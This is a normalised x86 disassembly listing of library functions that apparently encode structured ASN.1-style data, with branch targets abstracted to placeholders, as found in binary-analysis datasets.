mov esi [ esp + 0x30 ]
sub_100323f0
mov eax 0xc
call sub_1001d0d0
mov eax [ esp + 0x24 ]
push ebx
mov ebx [ esp + 0x2c ]
push ebp
mov edx [ eax ]
push esi
mov esi [ esp + 0x44 ]
push edi
test esi esi
mov [ esp + 0x10 ] edx
mov edi edx
je r-xdata
lea edx [ esp + 0x48 ]
push ebx
lea eax [ esp + 0x18 ]
push edx
lea ecx [ esp + 0x20 ]
push eax
lea edx [ esp + 0x1c ]
push ecx
push edx
call sub_1002e880
add esp 0x14
test esi esi
je r-xdata
cmp [ esi ] 0x0
je r-xdata
mov edx [ esp + 0x10 ]
mov ebp [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov ecx [ esp + 0x48 ]
mov ebp [ esp + 0x18 ]
mov [ esi + 0xc ] edx
mov edx [ esp + 0x10 ]
mov [ esi + 0x10 ] ecx
mov ecx edx
mov [ esi + 0x4 ] eax
sub ecx edi
mov [ esi + 0x8 ] ebp
test al 0x81
mov [ esi + 0x14 ] ecx
mov [ esi ] 0x1
jne r-xdata
mov ecx [ esi + 0x10 ]
mov ebp [ esi + 0x8 ]
mov eax [ esi + 0x4 ]
mov [ esp + 0x48 ] ecx
mov ecx [ esi + 0xc ]
mov [ esp + 0x18 ] ebp
mov [ esp + 0x14 ] ecx
mov ecx [ esi + 0x14 ]
add edx ecx
mov [ esp + 0x10 ] edx
jmp r-xdata
mov ecx [ esp + 0x3c ]
test ecx ecx
jl r-xdata
push 0x517
push r--data
push 0x66
push 0x68
push 0xd
call sub_1001de60
add esp 0x14
test esi esi
je r-xdata
test al 0x80
je r-xdata
add ecx ebp
cmp ecx ebx
jle r-xdata
test al 0x1
je r-xdata
cmp ecx [ esp + 0x14 ]
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0xc
retn
mov [ esi ] 0x0
push 0x50e
push r--data
push 0x9b
push 0x68
push 0xd
call sub_1001de60
add esp 0x14
mov [ esi ] 0x0
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
mov esi [ esp + 0x2c ]
test esi esi
je r-xdata
mov ecx [ esp + 0x38 ]
sub edi edx
add edi ecx
mov ebp edi
mov al [ esp + 0x44 ]
test al al
je r-xdata
mov ecx [ esp + 0x40 ]
mov ebx [ esp + 0x48 ]
cmp ecx ebx
jne r-xdata
mov ecx [ esp + 0x30 ]
test ecx ecx
je r-xdata
mov cl al
and cl 0x1
mov [ esi ] cl
test esi esi
je r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0xc
retn
test esi esi
je r-xdata
mov eax [ esp + 0x20 ]
test eax eax
je r-xdata
and al 0x20
mov [ ecx ] al
push 0x524
push r--data
push 0xa8
push 0x68
push 0xd
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
mov [ esi ] 0x0
mov [ esi ] 0x0
mov eax [ esp + 0x28 ]
test eax eax
je r-xdata
mov [ eax ] ebp
mov eax [ esp + 0x24 ]
test eax eax
je r-xdata
mov cl [ esp + 0x48 ]
mov [ eax ] cl
mov eax [ esp + 0x34 ]
pop edi
pop esi
pop ebp
mov [ eax ] edx
mov eax 0x1
pop ebx
add esp 0xc
retn
mov ecx [ esp + 0x14 ]
mov [ eax ] ecx
sub_100325c0
mov eax [ esp + 0x4 ]
push ebx
mov ebx [ esp + 0xc ]
push ebp
push esi
push edi
test ebx ebx
mov [ esp + 0x14 ] eax
je r-xdata
mov ecx [ esp + 0x1c ]
push 0x0
push 0xffffffff
push ecx
lea edx [ esp + 0x20 ]
push ebx
push edx
call sub_10032660
add esp 0x14
pop edi
pop esi
pop ebp
pop ebx
retn
cmp [ ebx ] 0x0
jne r-xdata
mov ebp [ esp + 0x1c ]
push 0x0
push 0xffffffff
push ebp
lea ecx [ esp + 0x20 ]
push 0x0
push ecx
call sub_10032660
mov edi eax
add esp 0x14
test edi edi
jg r-xdata
push 0x71
push r--data
push edi
call sub_1001d4c0
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
push 0x0
push 0xffffffff
lea edx [ esp + 0x24 ]
push ebp
lea eax [ esp + 0x20 ]
push edx
push eax
mov [ esp + 0x30 ] esi
call sub_10032660
add esp 0x14
mov eax edi
mov [ ebx ] esi
pop edi
pop esi
pop ebp
pop ebx
retn
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
retn
sub_10032660
mov eax 0x8
call sub_1001d0d0
push ebx
push ebp
push esi
mov esi [ esp + 0x20 ]
xor ebx ebx
xor ebp ebp
mov al [ esi ]
mov ecx [ esi + 0x10 ]
push edi
mov edi [ esp + 0x1c ]
test al al
mov [ esp + 0x10 ] 0x1
mov [ esp + 0x14 ] ebp
je r-xdata
test ecx ecx
je r-xdata
cmp [ edi ] 0x0
je r-xdata
movsx eax al
cmp eax 0x6
ja r-xdata
mov edx [ ecx + 0x10 ]
test edx edx
je r-xdata
xor eax eax
jmp [ eax * 4 + jump_table_10032980 ]
mov [ esp + 0x14 ] edx
mov ebp edx
mov eax [ esi + 0x8 ]
mov ecx [ esp + 0x2c ]
mov edx [ esp + 0x28 ]
push ecx
test eax eax
push edx
je r-xdata
mov ecx [ esp + 0x2c ]
mov edx [ esp + 0x20 ]
push ecx
push 0xffffffff
push esi
push edx
push edi
call sub_10032e90
add esp 0x14
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
test ebp ebp
je r-xdata
mov edx [ esp + 0x2c ]
mov eax [ esp + 0x28 ]
push edx
mov edx [ esp + 0x24 ]
push eax
push esi
push edx
push edi
call [ ecx + 0x14 ]
add esp 0x14
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov esi [ esp + 0x20 ]
test esi esi
je r-xdata
mov eax [ esp + 0x2c ]
test ah 0x8
je r-xdata
mov ebx [ esp + 0x20 ]
push esi
push edi
lea eax [ esp + 0x24 ]
push ebx
push eax
call sub_10050770
add esp 0x10
test eax eax
jl r-xdata
mov eax [ esp + 0x28 ]
push esi
push eax
push edi
call sub_10032e90
add esp 0x14
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
push eax
mov eax [ esp + 0x2c ]
push eax
push edi
call sub_100329a0
add esp 0x14
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
push esi
push edi
call sub_100505b0
add esp 0x8
test eax eax
jl r-xdata
push esi
push edi
push 0x6
call ebp
add esp 0xc
test eax eax
je r-xdata
mov eax [ edi ]
push esi
push eax
call [ ecx + 0xc ]
add esp 0x8
test esi esi
je r-xdata
mov ebx [ esi ]
mov [ esp + 0x10 ] 0x2
jle r-xdata
test ebp ebp
je r-xdata
cmp eax [ esi + 0xc ]
jge r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov ecx [ esp + 0x28 ]
cmp ecx 0xffffffff
je r-xdata
mov eax [ esp + 0x28 ]
mov [ esp + 0x1c ] 0x0
cmp eax 0xffffffff
jne r-xdata
mov eax [ esp + 0x1c ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
push esi
push edi
push 0x7
call ebp
add esp 0xc
mov ecx [ esi + 0x8 ]
lea eax [ eax + eax * 4 ]
lea esi [ ecx + eax * 4 ]
push esi
push edi
call sub_100507f0
mov edx [ esp + 0x34 ]
mov ecx [ esp + 0x28 ]
push edx
push 0xffffffff
push esi
push ecx
push eax
call sub_100329a0
add esp 0x1c
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov dl [ ebx ]
pop edi
and dl 0x20
pop esi
or dl cl
mov cl [ esp + 0x24 ]
or dl cl
pop ebp
mov [ ebx ] dl
pop ebx
add esp 0x8
retn
test ebp ebp
je r-xdata
mov eax [ esp + 0x2c ]
mov [ esp + 0x28 ] 0x10
and al 0x3f
mov [ esp + 0x2c ] eax
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x8 ]
xor ebp ebp
mov [ esp + 0x24 ] ecx
test eax eax
jle r-xdata
push esi
push edi
push 0x6
call ebp
add esp 0xc
test eax eax
je r-xdata
mov ebp [ esp + 0x28 ]
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x10 ]
push ebp
push edx
push eax
call sub_1002eb00
add esp 0xc
mov [ esp + 0x28 ] eax
test ebx ebx
je r-xdata
mov edx [ esp + 0x24 ]
push 0x1
push edx
push edi
call sub_10050810
mov ebx eax
add esp 0xc
test ebx ebx
je r-xdata
mov ecx [ esp + 0x2c ]
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x10 ]
push ecx
push ebp
push edx
push eax
push ebx
call sub_1002ea00
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x8 ]
add esp 0x14
xor ebp ebp
test eax eax
mov [ esp + 0x24 ] ecx
jle r-xdata
push ebx
push edi
call sub_100507f0
mov ecx [ esp + 0x34 ]
push ecx
push 0xffffffff
push ebx
push 0x0
push eax
call sub_100329a0
mov ebx [ esp + 0x38 ]
mov edx [ esp + 0x40 ]
add esp 0x1c
add ebx eax
mov eax [ esi + 0xc ]
add edx 0x14
inc ebp
mov [ esp + 0x1c ] ebx
cmp ebp eax
mov [ esp + 0x24 ] edx
jl r-xdata
cmp [ esp + 0x10 ] 0x2
jne r-xdata
mov edx [ esp + 0x24 ]
push 0x1
push edx
push edi
call sub_10050810
mov ebx eax
add esp 0xc
test ebx ebx
je r-xdata
mov ebx [ esp + 0x20 ]
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
push ebx
call sub_1002eae0
add esp 0x4
push ebx
push edi
call sub_100507f0
mov ecx [ esp + 0x34 ]
mov edx [ esp + 0x28 ]
push ecx
push 0xffffffff
push ebx
push edx
push eax
call sub_100329a0
mov edx [ esp + 0x40 ]
mov eax [ esi + 0xc ]
add esp 0x1c
add edx 0x14
inc ebp
mov [ esp + 0x24 ] edx
cmp ebp eax
jl r-xdata
mov eax [ esp + 0x28 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
push esi
push edi
push 0x7
call eax
add esp 0xc
test eax eax
je r-xdata
mov ebx [ esp + 0x20 ]
sub_100329a0
mov eax 0x1c
call sub_1001d0d0
mov edx [ esp + 0x28 ]
push ebx
push ebp
push esi
mov ecx [ edx ]
push edi
test cl 0x18
mov [ esp + 0x24 ] ecx
je r-xdata
mov eax [ esp + 0x3c ]
cmp eax 0xffffffff
je r-xdata
mov esi [ esp + 0x3c ]
or eax 0xffffffff
cmp esi eax
jne r-xdata
mov ebx [ esp + 0x40 ]
mov [ esp + 0x3c ] 0xffffffff
mov [ esp + 0x10 ] 0x0
mov ebx [ esp + 0x40 ]
mov [ esp + 0x3c ] eax
mov eax ebx
and eax 0xc0
mov [ esp + 0x10 ] eax
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn
mov edi [ edx + 0x4 ]
mov ebx [ esp + 0x40 ]
mov eax ecx
mov [ esp + 0x3c ] edi
and eax 0xc0
mov [ esp + 0x10 ] eax
jmp r-xdata
mov [ esp + 0x14 ] esi
test bh 0x8
mov [ esp + 0x14 ] 0x2
jne r-xdata
mov eax [ esp + 0x10 ]
mov edi [ esp + 0x3c ]
and bl 0x3f
mov esi 0x1
test ch 0x8
mov [ esp + 0x40 ] ebx
je r-xdata
test cl 0x10
je r-xdata
mov edx [ esp + 0x30 ]
mov ebp [ edx ]
xor edx edx
cmp ebp edx
jne r-xdata
test cl 0x6
je r-xdata
or eax ebx
push eax
push edi
call [ edx + 0x10 ]
mov ecx [ esp + 0x3c ]
mov edx [ esp + 0x38 ]
push eax
push ecx
push edx
call sub_10032660
add esp 0x14
push ebx
push 0xffffffff
call [ edx + 0x10 ]
mov ebp [ esp + 0x38 ]
push eax
push 0x0
push ebp
call sub_10032660
mov esi eax
add esp 0x14
test esi esi
jne r-xdata
test cl 0x2
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x1c
retn
mov eax [ esp + 0x14 ]
push edi
push esi
push eax
call sub_1002eb00
mov edi [ esp + 0x40 ]
add esp 0xc
test edi edi
mov [ esp + 0x18 ] eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn
mov [ esp + 0x30 ] edx
test cl 0x4
mov [ esp + 0x30 ] esi
je r-xdata
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x3c ]
push ecx
push edx
push esi
mov esi [ esp + 0x20 ]
push esi
push edi
call sub_1002ea00
mov eax [ esp + 0x4c ]
add esp 0x14
push ebx
push 0xffffffff
call [ eax + 0x10 ]
push eax
push edi
push ebp
call sub_10032660
add esp 0x14
cmp esi 0x2
jne r-xdata
mov esi [ esp + 0x30 ]
xor eax eax
cmp esi edx
mov [ esp + 0x20 ] edx
setne al
add eax 0x10
mov [ esp + 0x1c ] eax
test cl 0x10
jne r-xdata
cmp edi 0xffffffff
je r-xdata
mov [ esp + 0x30 ] 0x2
jmp r-xdata
push edi
call sub_1002eae0
add esp 0x4
mov eax [ esp + 0x1c ]
mov esi [ esp + 0x14 ]
push eax
push edi
push esi
call sub_1002eb00
mov ecx [ esp + 0x30 ]
add esp 0xc
and ecx 0x10
mov ebx eax
mov [ esp + 0x24 ] ecx
je r-xdata
push esi
push ebp
call sub_1001e7c0
mov ecx [ esp + 0x40 ]
add esp 0x8
mov [ esp + 0x28 ] eax
push ebx
push 0xffffffff
call [ ecx + 0x10 ]
push eax
lea edx [ esp + 0x34 ]
push 0x0
push edx
call sub_10032660
add edi eax
push ebp
inc esi
call sub_1001e7b0
add esp 0x18
cmp esi eax
jl r-xdata
mov [ esp + 0x1c ] edi
mov [ esp + 0x20 ] eax
jmp r-xdata
mov [ esp + 0x18 ] ebx
mov ecx [ esp + 0x3c ]
push ecx
push ebx
push esi
call sub_1002eb00
mov ecx [ esp + 0x30 ]
add esp 0xc
mov [ esp + 0x18 ] eax
jmp r-xdata
push ebp
xor edi edi
xor esi esi
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
test ecx ecx
je r-xdata
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn
mov eax [ esp + 0x34 ]
test eax eax
jne r-xdata
mov edx [ esp + 0x20 ]
mov ecx [ esp + 0x1c ]
push edx
push ecx
push edi
push esi
push eax
call sub_1002ea00
mov edx [ esp + 0x4c ]
add esp 0x14
call [ edx + 0x10 ]
mov ebx eax
mov eax [ esp + 0x30 ]
xor esi esi
cmp eax esi
mov [ esp + 0x38 ] esi
je r-xdata
mov edx [ esp + 0x10 ]
mov ecx [ esp + 0x3c ]
push edx
push ecx
push ebx
push esi
push eax
call sub_1002ea00
mov eax [ esp + 0x48 ]
add esp 0x14
push ebp
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
push ebp
call sub_1001e7b0
add esp 0x4
cmp eax 0x2
jl r-xdata
cmp [ esp + 0x14 ] 0x2
jne r-xdata
push esi
push ebp
call sub_1001e7c0
mov ecx [ esp + 0x48 ]
mov edx [ esp + 0x3c ]
push ecx
mov [ esp + 0x48 ] eax
push 0xffffffff
push ebx
lea eax [ esp + 0x50 ]
push edx
push eax
call sub_10032660
push ebp
inc esi
call sub_1001e7b0
add esp 0x20
cmp esi eax
jl r-xdata
push 0x1c7
push r--data
push ebp
call sub_1001e7b0
lea eax [ eax + eax * 2 ]
add esp 0x4
shl eax 0x2
push eax
call sub_1001d4c0
push 0x1c8
mov esi eax
push r--data
push edi
mov [ esp + 0x28 ] esi
call sub_1001d4c0
add esp 0x18
mov [ esp + 0x20 ] eax
test esi esi
je r-xdata
mov esi [ esp + 0x34 ]
push esi
call sub_1002eae0
mov eax [ esp + 0x28 ]
add esp 0x4
test eax eax
je r-xdata
jmp r-xdata
test eax eax
jne r-xdata
push esi
call sub_1002eae0
mov eax [ esp + 0x1c ]
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn
push ebp
mov [ esp + 0x3c ] eax
xor edi edi
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
jmp r-xdata
push sub_10032e50
push 0xc
push ebp
call sub_1001e7b0
add esp 0x4
push eax
push esi
call qsort
mov eax [ esp + 0x44 ]
push ebp
mov [ esp + 0x54 ] 0x0
mov ecx [ eax ]
mov [ esp + 0x4c ] ecx
call sub_1001e7b0
add esp 0x14
test eax eax
jle r-xdata
add esi 0x8
mov edx [ esp + 0x34 ]
mov eax [ esp + 0x30 ]
mov ecx [ esp + 0x38 ]
cmp eax 0x2
mov [ edx ] ecx
jne r-xdata
lea ebx [ esi + 0x4 ]
push edi
push ebp
call sub_1001e7c0
mov edx [ esp + 0x48 ]
mov ecx [ esp + 0x40 ]
mov [ esp + 0x44 ] eax
push edx
mov [ esi - 0x8 ] ecx
push 0xffffffff
lea eax [ esp + 0x48 ]
push ebx
lea ecx [ esp + 0x50 ]
push eax
push ecx
call sub_10032660
mov [ esi - 0x4 ] eax
mov edx [ esp + 0x58 ]
mov [ esi ] edx
push ebp
inc edi
add esi 0xc
call sub_1001e7b0
add esp 0x20
cmp edi eax
jl r-xdata
mov esi [ esp + 0x10 ]
push esi
call sub_1001d740
mov edx [ esp + 0x24 ]
push edx
call sub_1001d740
add esp 0x8
push ebp
xor esi esi
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
mov ecx [ ebx ]
mov esi [ ebx - 0x4 ]
mov edi [ esp + 0x38 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push ebp
and ecx 0x3
add ebx 0xc
[ edi ] [ esi ]
mov eax [ ebx - 0xc ]
mov edx [ esp + 0x3c ]
mov esi [ esp + 0x44 ]
add edx eax
inc esi
mov [ esp + 0x3c ] edx
mov [ esp + 0x44 ] esi
call sub_1001e7b0
add esp 0x4
cmp esi eax
jl r-xdata
mov esi [ esp + 0x10 ]
mov esi [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
lea edi [ eax + 0x8 ]
mov ecx [ edi ]
push ecx
push esi
push ebp
call sub_1001e7e0
push ebp
inc esi
add edi 0xc
call sub_1001e7b0
add esp 0x10
cmp esi eax
jl r-xdata
sub_10032e50
mov eax [ esp + 0x4 ]
push ebx
push esi
mov esi [ esp + 0x10 ]
mov edx [ eax + 0x4 ]
mov ebx [ esi + 0x4 ]
mov ecx edx
cmp edx ebx
jl r-xdata
push edi
mov edi [ esi ]
mov esi [ eax ]
xor eax eax
[ esi ] [ edi ]
pop edi
je r-xdata
mov ecx ebx
test eax eax
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
pop esi
pop ebx
retn
mov eax edx
sub eax ebx
sub_10032e90
mov eax 0x4
call sub_1001d0d0
mov edx [ esp + 0x8 ]
push ebx
push ebp
mov ebp [ esp + 0x18 ]
push edi
lea ecx [ esp + 0x1c ]
mov eax [ ebp + 0x4 ]
xor ebx ebx
push ebp
push ecx
push ebx
push edx
mov [ esp + 0x2c ] eax
call sub_10032f80
mov edi eax
mov eax [ esp + 0x2c ]
add esp 0x10
cmp eax 0x10
je r-xdata
mov [ esp + 0xc ] 0x0
cmp eax 0x11
je r-xdata
cmp edi 0xfffffffe
jne r-xdata
pop edi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
cmp eax 0xfffffffd
mov [ esp + 0xc ] 0x1
jne r-xdata
cmp [ esp + 0x20 ] 0xffffffff
jne r-xdata
mov ebx 0x2
xor edi edi
cmp edi 0xffffffff
jne r-xdata
push esi
mov esi [ esp + 0x1c ]
test esi esi
je r-xdata
mov [ esp + 0x20 ] eax
mov eax [ esp + 0x10 ]
pop esi
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov eax edi
pop edi
pop ebp
pop ebx
pop ecx
retn
mov edx [ esp + 0x20 ]
push edx
push edi
push ebx
call sub_1002eb00
add esp 0xc
pop edi
pop ebp
pop ebx
pop ecx
retn
mov eax [ esi ]
mov ecx [ esp + 0x18 ]
lea edx [ esp + 0x20 ]
push ebp
push edx
push eax
push ecx
call sub_10032f80
add esp 0x10
test ebx ebx
je r-xdata
mov eax [ esp + 0x28 ]
mov ecx [ esp + 0x24 ]
push eax
push ecx
push edi
push ebx
push esi
call sub_1002ea00
add esp 0x14
add [ esi ] edi
push esi
call sub_1002eae0
add esp 0x4
jmp r-xdata
sub_10032f80
mov edx [ esp + 0x10 ]
push esi
push edi
mov eax [ edx + 0x10 ]
test eax eax
je r-xdata
mov al [ edx ]
mov ecx [ esp + 0xc ]
test al al
jne r-xdata
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
cmp [ ecx ] 0x0
jne r-xdata
cmp [ edx + 0x4 ] 0x1
je r-xdata
mov ecx [ esp + 0x14 ]
push edx
mov edx [ esp + 0x14 ]
push ecx
mov ecx [ esp + 0x14 ]
push edx
push ecx
call eax
add esp 0x10
pop edi
pop esi
retn
cmp al 0x5
mov esi 0xfffffffc
jne r-xdata
pop edi
or eax 0xffffffff
pop esi
retn
cmp [ edx + 0x4 ] esi
jne r-xdata
mov eax [ ecx ]
mov edi [ esp + 0x14 ]
mov eax [ eax + 0x4 ]
mov [ edi ] eax
jmp r-xdata
mov eax [ esp + 0x14 ]
mov eax [ eax ]
mov ecx [ ecx ]
mov edi [ esp + 0x14 ]
mov eax [ ecx ]
add ecx 0x4
mov [ edi ] eax
jmp r-xdata
cmp eax 0xa
jg r-xdata
sub eax 0x102
je r-xdata
je r-xdata
mov eax [ esp + 0x10 ]
lea edx [ esp + 0x10 ]
neg eax
sbb eax eax
and eax edx
push eax
mov eax [ ecx ]
push eax
call sub_1002f140
add esp 0x8
sub eax 0x8
je r-xdata
dec eax
cmp eax 0x5
ja r-xdata
mov eax [ ecx ]
mov ecx [ edx + 0x14 ]
cmp ecx 0x800
jne r-xdata
jmp [ eax * 4 + jump_table_10033108 ]
mov esi [ eax + 0x8 ]
mov eax [ eax ]
test [ eax + 0xc ] 0x10
je r-xdata
mov eax [ ecx ]
mov esi [ eax + 0x10 ]
mov eax [ eax + 0xc ]
jmp r-xdata
xor esi esi
xor eax eax
jmp r-xdata
mov eax [ ecx ]
cmp eax 0xffffffff
jne r-xdata
mov edx [ esp + 0x10 ]
mov ecx [ ecx ]
neg edx
sbb edx edx
lea eax [ esp + 0x10 ]
and edx eax
push edx
push ecx
call sub_100508b0
add esp 0x8
pop edi
pop esi
retn
pop edi
pop esi
retn
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
test ecx ecx
je r-xdata
mov edi [ esp + 0x10 ]
test edi edi
je r-xdata
cmp [ edx + 0x4 ] esi
je r-xdata
pop edi
or eax eax
pop esi
retn
mov ecx eax
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
pop edi
mov eax 0xfffffffe
pop esi
retn
mov [ eax + 0x8 ] ecx
mov [ eax ] 0x0
mov cl [ ecx ]
lea esi [ esp + 0x14 ]
mov [ esp + 0x14 ] cl
mov eax 0x1
jmp r-xdata
test eax eax
je r-xdata
mov eax [ edx + 0x14 ]
test eax eax
jne r-xdata
mov esi [ edx + 0x14 ]
test esi esi
jle r-xdata
pop edi
or eax 0xffffffff
pop esi
retn
test eax eax
jne r-xdata
pop edi
or eax 0xffffffff
pop esi
retn
sub_10033120
mov eax 0x4
call sub_1001d0d0
mov eax [ esp + 0x8 ]
push 0x0
lea ecx [ esp + 0x4 ]
push eax
push ecx
mov [ esp + 0xc ] 0x0
call sub_10033180
xor edx edx
test eax eax
mov eax [ esp + 0xc ]
setle dl
dec edx
and eax edx
add esp 0x10
retn
sub_10033180
push ebx
mov ebx [ esp + 0xc ]
push ebp
push esi
mov eax [ ebx + 0x10 ]
push edi
test eax eax
je r-xdata
mov [ esp + 0x18 ] 0x0
mov eax [ eax + 0x10 ]
test eax eax
mov [ esp + 0x18 ] eax
jne r-xdata
movsx eax [ ebx ]
cmp eax 0x6
ja r-xdata
mov [ ebp ] 0x0
mov esi [ esp + 0x1c ]
mov ebp [ esp + 0x14 ]
test esi esi
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
jmp [ eax * 4 + jump_table_10033628 ]
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
mov esi [ ebx + 0x8 ]
test esi esi
je r-xdata
push ebx
push ebp
call sub_10033730
add esp 0x8
jmp r-xdata
mov edi [ esp + 0x18 ]
test edi edi
je r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ eax ]
test eax eax
je r-xdata
call [ esi + 0x10 ]
mov ecx [ esi ]
test cl 0x1
je r-xdata
test eax eax
je r-xdata
test esi esi
jne r-xdata
push ebx
push ebp
push 0x0
call edi
add esp 0xc
test eax eax
je r-xdata
test esi esi
jne r-xdata
push ebx
push ebp
push 0x0
call eax
add esp 0xc
test eax eax
je r-xdata
push ebx
push ebp
call eax
add esp 0x8
test eax eax
je r-xdata
call eax
test eax eax
mov [ ebp ] eax
je r-xdata
test ch 0x3
je r-xdata
test ecx 0x306
je r-xdata
push 0xd6
push r--data
push 0x41
push 0x79
push 0xd
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
push ebx
push 0xffffffff
push ebp
call sub_100505d0
add esp 0xc
test edi edi
je r-xdata
mov edx [ ebx + 0x14 ]
push 0xa3
push r--data
push edx
call sub_1001d4c0
mov edi eax
add esp 0xc
test edi edi
mov [ ebp ] edi
je r-xdata
push 0xdd
push r--data
push 0x64
push 0x79
push 0xd
call sub_1001de60
push ebx
push ebp
call sub_10033860
add esp 0x1c
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
cmp eax 0x2
je r-xdata
mov eax [ ebx + 0xc ]
mov edi [ ebx + 0x8 ]
test eax eax
mov [ esp + 0x1c ] 0x0
jle r-xdata
mov eax [ ebx + 0x14 ]
push 0xbf
push r--data
push eax
call sub_1001d4c0
mov edi eax
add esp 0xc
test edi edi
mov [ ebp ] edi
je r-xdata
cmp eax 0x2
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
test cl 0x6
je r-xdata
pop edi
mov [ ebp ] 0x0
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
call [ esi + 0x10 ]
mov dl [ eax ]
movsx ecx dl
cmp ecx 0x6
ja r-xdata
pop edi
mov [ ebp ] 0x0
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
push ebx
push ebp
push 0x1
call [ esp + 0x24 ]
add esp 0xc
test eax eax
je r-xdata
mov ecx [ ebx + 0x14 ]
xor eax eax
mov edx ecx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov edi [ esp + 0x18 ]
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
push edi
push ebp
call sub_100507f0
add esp 0x8
mov esi eax
call [ edi + 0x10 ]
mov ecx [ edi ]
test cl 0x1
je r-xdata
mov ecx [ ebx + 0x14 ]
xor eax eax
mov edx ecx
push ebx
shr ecx 0x2
[ edi ]
mov ecx edx
push esi
and ecx 0x3
push ebp
[ edi ]
call sub_100505f0
push ebx
push ebp
call sub_10050650
add esp 0x14
and ecx 0x400
push ecx
push eax
push ebp
call sub_10033180
add esp 0xc
call sub_1001e3c0
test eax eax
je r-xdata
jmp [ ecx * 4 + jump_table_10033644 ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
push ebx
push ebp
push 0x1
call eax
add esp 0xc
test eax eax
jne r-xdata
test ch 0x3
je r-xdata
test ecx 0x306
je r-xdata
push 0x125
push r--data
push 0x41
push 0x85
push 0xd
call sub_1001de60
add esp 0x14
pop edi
mov [ ebp ] eax
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
mov ecx [ eax + 0x10 ]
test ecx ecx
je r-xdata
mov ecx [ eax + 0x8 ]
test ecx ecx
je r-xdata
test eax eax
je r-xdata
test cl 0x6
je r-xdata
mov [ esi ] 0x0
jmp r-xdata
call [ edi + 0x10 ]
mov dl [ eax ]
movsx ecx dl
cmp ecx 0x6
ja r-xdata
mov [ esi ] 0x0
jmp r-xdata
mov ecx [ ecx + 0xc ]
test ecx ecx
je r-xdata
test eax eax
je r-xdata
push ecx
push ebp
call sub_10033680
add esp 0x8
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
retn
mov ecx [ eax + 0x10 ]
test ecx ecx
jne r-xdata
and ecx 0x400
push ecx
push eax
push esi
call sub_10033180
add esp 0xc
test eax eax
je r-xdata
call sub_1001e3c0
test eax eax
je r-xdata
mov eax [ esp + 0x1c ]
mov ecx [ ebx + 0xc ]
add edi 0x14
inc eax
cmp eax ecx
mov [ esp + 0x1c ] eax
jge r-xdata
jmp [ ecx * 4 + jump_table_10033660 ]
push eax
push ebp
call ecx
add esp 0x8
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
retn
mov ecx [ eax + 0x10 ]
test ecx ecx
je r-xdata
mov ecx [ ecx + 0x10 ]
test ecx ecx
je r-xdata
cmp dl 0x5
je r-xdata
mov [ esi ] eax
jmp r-xdata
jmp r-xdata
mov ecx [ eax + 0x10 ]
test ecx ecx
je r-xdata
mov ecx [ eax + 0x8 ]
test ecx ecx
je r-xdata
test eax eax
je r-xdata
cmp dl 0x5
je r-xdata
push eax
push ebp
call ecx
add esp 0x8
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
retn
